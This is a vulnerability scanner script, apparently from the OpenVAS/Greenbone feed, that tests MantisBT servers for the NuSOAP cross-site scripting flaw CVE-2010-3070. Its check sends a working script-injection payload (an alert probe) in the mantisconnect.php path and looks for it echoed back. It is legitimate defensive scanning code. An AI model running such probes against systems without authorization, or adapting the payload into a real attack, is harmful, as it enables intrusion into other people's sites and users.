CPE = "cpe:/a:mantisbt:mantisbt";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902318" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-10-01 08:36:34 +0200 (Fri, 01 Oct 2010)" );
	script_cve_id( "CVE-2010-3070" );
	script_bugtraq_id( 42959 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "NuSOAP 'nusoap.php' Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://www.mantisbt.org/bugs/view.php?id=12312" );
	script_xref( name: "URL", value: "http://sourceforge.net/projects/nusoap/forums/forum/193579/topic/3834005" );
	script_xref( name: "URL", value: "http://lists.fedoraproject.org/pipermail/package-announce/2010-September/048325.html" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "mantis_detect.sc" );
	script_mandatory_keys( "mantisbt/detected" );
	script_family( "Web application abuses" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "insight", value: "The flaw is due to an input validation error in
  /api/soap/mantisconnect.php in NuSOAP." );
	script_tag( name: "solution", value: "Apply the patch provided by vendor." );
	script_tag( name: "summary", value: "This host is running NuSOAP and is prone to Cross-site scripting
  Vulnerability." );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to execute arbitrary
  script code in the browser of an unsuspecting user in the context of the affected site." );
	script_tag( name: "affected", value: "NuSOAP version 0.9.5." );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!path = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(path == "/"){
	path = "";
}
req = http_get( item: path + "/api/soap/mantisconnect.php", port: port );
res = http_send_recv( port: port, data: req );
if(ContainsString( res, "<title>NuSOAP:" )){
	url = path + "/api/soap/mantisconnect.php" + "/1<ScRiPt>alert(\"VT-XSS-Test\")</ScRiPt>";
	req = http_get( item: url, port: port );
	res = http_send_recv( port: port, data: req );
	if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<ScRiPt>alert(\"VT-XSS-Test\")</ScRiPt>" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

